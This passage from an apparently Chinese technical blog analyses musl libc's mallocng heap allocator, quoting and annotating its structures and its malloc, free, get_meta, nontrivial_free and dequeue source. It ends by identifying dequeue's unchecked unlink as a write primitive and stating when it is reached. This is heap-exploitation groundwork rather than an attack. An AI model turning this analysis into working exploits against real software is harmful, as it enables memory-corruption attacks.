class="keyword">char</span> data[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="group"><a href="#group" class="headerlink" title="group"></a><strong>group</strong></h4><p>在musl中一个meta管理的内存区域用group表示，一个meta对应一个group。<br>group中存放size相同的相邻chunk，通过idx和offset索引。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span><span class="comment">// meta的地址</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="keyword">char</span> pad[UNIT - <span class="keyword">sizeof</span>(struct meta *) - <span class="number">1</span>];<span class="comment">// 保证0x10字节对齐</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> storage[];<span class="meta"># chunk</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>通过chunk获取group地址</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct meta *<span class="title">get_meta</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    assert(!((<span class="keyword">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line">    <span class="keyword">int</span> offset = *(<span class="keyword">const</span> <span class="keyword">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> index = get_slot_index(p);</span><br><span class="line">    <span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">        assert(!offset);</span><br><span class="line">        offset = *(<span class="keyword">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">        assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="keyword">const</span> <span class="keyword">void</span> *)(p - UNIT*offset - UNIT);</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终就是：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">group_addr = chunk_addr - <span class="number">0x10</span> * offset - <span class="number">0x10</span></span><br></pre></td></tr></table></figure><h4 id="meta"><a href="#meta" class="headerlink" title="meta"></a><strong>meta</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span><span class="comment">//双向链表</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">// 这里指向管理的group 地址</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="keyword">uintptr_t</span> last_idx:<span class="number">5</span>; <span class="comment">//group中chunk数</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">uintptr_t</span> sizeclass:<span class="number">6</span>; <span class="comment">//管理group大小</span></span><br><span class="line">    <span class="keyword">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="keyword">uintptr_t</span>)<span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中如果这个meta 前后都没有，那么它的prev next 就指向它自己</p><p>avail_mask和freed_mask以bitmap方式表示group中chunk的状态</p><h4 id="meta-arena"><a href="#meta-arena" class="headerlink" title="meta_arena"></a><strong>meta_arena</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在内存页起始地址，是多个meta的集合，这样是为了meta &amp; 0xffffffffffff000就能找到meta_arena结构体。</p><p>结构体中比较重要的就是check，Musl为了保证meta不被伪造，会验证meta_arena中的check是否与malloc_context中的secret相等。</p><h4 id="malloc-context"><a href="#malloc-context" class="headerlink" title="malloc_context"></a><strong>malloc_context</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> secret;<span class="comment">//也就是用于和meta_area验证的值</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="keyword">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> init_done;</span><br><span class="line">    <span class="keyword">unsigned</span> mmap_counter;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">//释放的meta</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">//可用分配的meta</span></span><br><span class="line">    <span class="keyword">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">//可以分配的meta地址，idx与size相关</span></span><br><span class="line">    <span class="keyword">size_t</span> usage_by_class[<span class="number">48</span>];<span class="comment">//所有meta的group管理chunk数量</span></span><br><span class="line">    <span class="keyword">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> seq;</span><br><span class="line">    <span class="keyword">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="malloc和free的源码分析"><a href="#malloc和free的源码分析" class="headerlink" title="malloc和free的源码分析"></a>malloc和free的源码分析</h3><h4 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a><strong>malloc</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line"><span class="keyword">uint32_t</span> mask, first;</span><br><span class="line"><span class="keyword">int</span> sc;</span><br><span class="line"><span class="keyword">int</span> idx;</span><br><span class="line"><span class="keyword">int</span> ctr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;</span><br><span class="line"><span class="keyword">size_t</span> needed = n + IB + UNIT;</span><br><span class="line"><span class="keyword">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,</span><br><span class="line">MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">wrlock();</span><br><span class="line">step_seq();</span><br><span class="line">g = alloc_meta();</span><br><span class="line"><span class="keyword">if</span> (!g) &#123;</span><br><span class="line">unlock();</span><br><span class="line">munmap(p, needed);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">g-&gt;mem = p;</span><br><span class="line">g-&gt;mem-&gt;meta = g;</span><br><span class="line">g-&gt;last_idx = <span class="number">0</span>;</span><br><span class="line">g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">g-&gt;sizeclass = <span class="number">63</span>;</span><br><span class="line">g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// use a global counter to cycle offset in</span></span><br><span class="line"><span class="comment">// individually-mmapped allocations.</span></span><br><span class="line">ctx.mmap_counter++;</span><br><span class="line">idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">goto</span> success;</span><br><span class="line">&#125;<span class="comment">// 这上面就是验证是否超过最大size以及是否使用mmap进行申请空间</span></span><br><span class="line"></span><br><span class="line">sc = size_to_class(n);<span class="comment">// 将size转化成对应的size_classes的下标</span></span><br><span class="line"></span><br><span class="line">rdlock();</span><br><span class="line">g = ctx.active[sc];<span class="comment">// 取出对应sc的meta</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// use coarse size classes initially when there are not yet</span></span><br><span class="line"><span class="comment">// any groups of desired size. this allows counts of 2 or 3</span></span><br><span class="line"><span class="comment">// to be allocated at first rather than having to start with</span></span><br><span class="line"><span class="comment">// 7 or 5, the min counts for even size classes.</span></span><br><span class="line">    <span class="comment">// 没找到对应的meta 会执行下面的if语句</span></span><br><span class="line"><span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line"><span class="keyword">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];</span><br><span class="line"><span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line"><span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line"><span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">    &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">usage += <span class="number">3</span>;</span><br><span class="line"><span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">sc |= <span class="number">1</span>;</span><br><span class="line">g = ctx.active[sc];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;<span class="comment">// 寻找对应size的maeta的group可用的chunk</span></span><br><span class="line">mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">first = mask&amp;-mask;</span><br><span class="line"><span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">g-&gt;avail_mask = mask-first;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">idx = a_ctz_32(first);</span><br><span class="line"><span class="keyword">goto</span> success;</span><br><span class="line">&#125;</span><br><span class="line">upgradelock();</span><br><span class="line"></span><br><span class="line">idx = alloc_slot(sc, n);<span class="comment">// 使用alloc_slot寻找idx</span></span><br><span class="line"><span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line">success:</span><br><span class="line">ctr = ctx.mmap_counter;</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">return</span> enframe(g, idx, n, ctr);<span class="comment">// 取出chunk</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面总结一下：</p><pre><code> 1. 首先是判断size，是否超过限制，或者是否超过阀值 2. 若是size没有超过阀值，则会在active里找对应size的meta 3. 如果active对应size的meta 位置上为空，没找到那么尝试先找size更大的meta 4. 如果active对应size的meta位置上有对应的meta，尝试从这个meta中的group找到可用的chunk 5. 如果有空闲的chunk，就直接修改meta-&gt;avail_mask，然后利用enframe(g, idx, n, ctr); 6. 从对应meta 中的group 取出 第idx号chunk分配 7. 如果没有，break 跳出循环 8. 跳出循环后执行`idx = alloc_slot(sc, n);`     1. 使用group中被free的chunk     2. 从队列中其他meta的group 中找     3. 如果都不行就重新分配一个新的group 对应一个新的meta 9. enframe(g, idx, n, ctr) 取出 对应meta 中对应idx 的chunk</code></pre><h4 id="free"><a href="#free" class="headerlink" title="free"></a><strong>free</strong></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> get_meta(p);<span class="comment">// 得到chunk对应的meta</span></span><br><span class="line"><span class="keyword">int</span> idx = get_slot_index(p);<span class="comment">// 得到idx</span></span><br><span class="line"><span class="keyword">size_t</span> stride = get_stride(g);<span class="comment">// 找到size_classes中对应chunk的size</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *start = g-&gt;mem-&gt;storage + stride*idx;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *end = start + stride - IB;</span><br><span class="line">get_nominal_size(p, end);<span class="comment">// 算出chunk的真实大小</span></span><br><span class="line"><span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;idx, all = (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span>;</span><br><span class="line">((<span class="keyword">unsigned</span> <span class="keyword">char</span> *)p)[<span class="number">-3</span>] = <span class="number">255</span>;</span><br><span class="line"><span class="comment">// invalidate offset to group header, and cycle offset of</span></span><br><span class="line"><span class="comment">// used region within slot if current offset is zero.</span></span><br><span class="line">*(<span class="keyword">uint16_t</span> *)((<span class="keyword">char</span> *)p<span class="number">-2</span>) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// release any whole pages contained in the slot to be freed</span></span><br><span class="line"><span class="comment">// unless it&#x27;s a single-slot group that will be unmapped.</span></span><br><span class="line"><span class="keyword">if</span> (((<span class="keyword">uintptr_t</span>)(start<span class="number">-1</span>) ^ (<span class="keyword">uintptr_t</span>)end) &gt;= <span class="number">2</span>*PGSZ &amp;&amp; g-&gt;last_idx) &#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> *base = start + (-(<span class="keyword">uintptr_t</span>)start &amp; (PGSZ<span class="number">-1</span>));</span><br><span class="line"><span class="keyword">size_t</span> len = (end-base) &amp; -PGSZ;</span><br><span class="line"><span class="keyword">if</span> (len) madvise(base, len, MADV_FREE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// atomic free without locking if this is neither first or last slot</span></span><br><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line"><span class="keyword">uint32_t</span> freed = g-&gt;freed_mask;</span><br><span class="line"><span class="keyword">uint32_t</span> avail = g-&gt;avail_mask;</span><br><span class="line"><span class="keyword">uint32_t</span> mask = freed | avail; <span class="comment">// 将free的chunk加进去</span></span><br><span class="line">assert(!(mask&amp;self));</span><br><span class="line"><span class="keyword">if</span> (!freed || mask+self==all) <span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (!MT)</span><br><span class="line">g-&gt;freed_mask = freed+self;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;freed_mask, freed, freed+self)!=freed)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wrlock();</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mapinfo</span> <span class="title">mi</span> =</span> nontrivial_free(g, idx);</span><br><span class="line">unlock();</span><br><span class="line"><span class="keyword">if</span> (mi.len) munmap(mi.base, mi.len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结一下：</p><pre><code> 1. 通过get_meta(p)得到meta，通过get_slot_index(p)得到对应chunk的 idx -&gt; 通过get_nominal_size(p, end) 算出真实大小 2. 重置idx 和 offset idx 被置为0xff 标记chunk， 修改freed_mask 标记chunk被释放 3. 最后调用nontrivial_free 完成关于meta一些剩余操作</code></pre><blockquote><p>仔细观察分配的过程，我们也可以看出为什么free 的chunk不能立即回收使用，因为有空闲的chunk的时候，分配chunk是直接设置meta-&gt;avail_mask</p><p>然后直接enframe() 直接从group中取出 chunk即可，不会设置meta-&gt;freed</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct meta *<span class="title">get_meta</span><span class="params">(<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">assert(!((<span class="keyword">uintptr_t</span>)p &amp; <span class="number">15</span>));</span><br><span class="line"><span class="keyword">int</span> offset = *(<span class="keyword">const</span> <span class="keyword">uint16_t</span> *)(p - <span class="number">2</span>);</span><br><span class="line"><span class="keyword">int</span> index = get_slot_index(p);</span><br><span class="line"><span class="keyword">if</span> (p[<span class="number">-4</span>]) &#123;</span><br><span class="line">assert(!offset);</span><br><span class="line">offset = *(<span class="keyword">uint32_t</span> *)(p - <span class="number">8</span>);</span><br><span class="line">assert(offset &gt; <span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">base</span> =</span> (<span class="keyword">const</span> <span class="keyword">void</span> *)(p - UNIT*offset - UNIT);<span class="comment">// 通过offset 和chunk 地址计算出group地址</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span> =</span> base-&gt;meta;<span class="comment">// 得到meta地址</span></span><br><span class="line">assert(meta-&gt;mem == base);<span class="comment">// 检查meta 是否指向对应的group</span></span><br><span class="line">assert(index &lt;= meta-&gt;last_idx);<span class="comment">// 检查chunk idx 是否超过 meta 最大chunk 容量</span></span><br><span class="line">assert(!(meta-&gt;avail_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line">assert(!(meta-&gt;freed_mask &amp; (<span class="number">1u</span>&lt;&lt;index)));</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">area</span> =</span> (<span class="keyword">void</span> *)((<span class="keyword">uintptr_t</span>)meta &amp; <span class="number">-4096</span>);<span class="comment">// 得到meta_area 地址</span></span><br><span class="line">assert(area-&gt;check == ctx.secret);<span class="comment">// 检查 check 校验值</span></span><br><span class="line"><span class="keyword">if</span> (meta-&gt;sizeclass &lt; <span class="number">48</span>) &#123;<span class="comment">// 检查是否属于 sizeclasses 管理的chunk 大小</span></span><br><span class="line">assert(offset &gt;= size_classes[meta-&gt;sizeclass]*index);</span><br><span class="line">assert(offset &lt; size_classes[meta-&gt;sizeclass]*(index+<span class="number">1</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">assert(meta-&gt;sizeclass == <span class="number">63</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (meta-&gt;maplen) &#123;</span><br><span class="line">assert(offset &lt;= meta-&gt;maplen*<span class="number">4096UL</span>/UNIT - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> (struct meta *)meta;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> struct mapinfo <span class="title">nontrivial_free</span><span class="params">(struct meta *g, <span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">uint32_t</span> self = <span class="number">1u</span>&lt;&lt;i;</span><br><span class="line"><span class="keyword">int</span> sc = g-&gt;sizeclass;</span><br><span class="line"><span class="keyword">uint32_t</span> mask = g-&gt;freed_mask | g-&gt;avail_mask;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mask+self == (<span class="number">2u</span>&lt;&lt;g-&gt;last_idx)<span class="number">-1</span> &amp;&amp; okay_to_free(g)) &#123;</span><br><span class="line">        <span class="comment">// 要么释放要么可用，且该meta可以被释放</span></span><br><span class="line"><span class="comment">// any multi-slot group is necessarily on an active list</span></span><br><span class="line"><span class="comment">// here, but single-slot groups might or might not be.</span></span><br><span class="line"><span class="keyword">if</span> (g-&gt;next) &#123;</span><br><span class="line">            <span class="comment">// 如果队列中 有下一个meta</span></span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="keyword">int</span> activate_new = (ctx.active[sc]==g);</span><br><span class="line">dequeue(&amp;ctx.active[sc], g);</span><br><span class="line">            <span class="comment">// 在出队操作后 ,ctx.active[sc]==meta -&gt;next  是指的刚刚出队meta 的下一个meta</span></span><br><span class="line"><span class="keyword">if</span> (activate_new &amp;&amp; ctx.active[sc])</span><br><span class="line">activate_group(ctx.active[sc]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> free_group(g);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">assert(sc &lt; <span class="number">48</span>);</span><br><span class="line"><span class="comment">// might still be active if there were no allocations</span></span><br><span class="line"><span class="comment">// after last available slot was taken.</span></span><br><span class="line"><span class="keyword">if</span> (ctx.active[sc] != g) &#123;</span><br><span class="line"><span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">a_or(&amp;g-&gt;freed_mask, self);</span><br><span class="line"><span class="keyword">return</span> (struct mapinfo)&#123; <span class="number">0</span> &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">dequeue</span><span class="params">(struct meta **phead, struct meta *m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">m-&gt;prev-&gt;next = m-&gt;next;</span><br><span class="line">m-&gt;next-&gt;prev = m-&gt;prev;</span><br><span class="line"><span class="keyword">if</span> (*phead == m) *phead = m-&gt;next;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">*phead = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">m-&gt;prev = m-&gt;next = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在不安全的解链操作了</p><p>可以看到没有任何的安全检测就直接往prev写入值了。那么这里进入到dequeue的条件主要有两点：</p><ul><li>第一种:如果一个group 中所有的chunk 都已经被使用，且没有free掉的chunk</li><li>第二种:group 中的chunk 当free掉最后一个chunk，都处于freed的状态</li></ul><h2 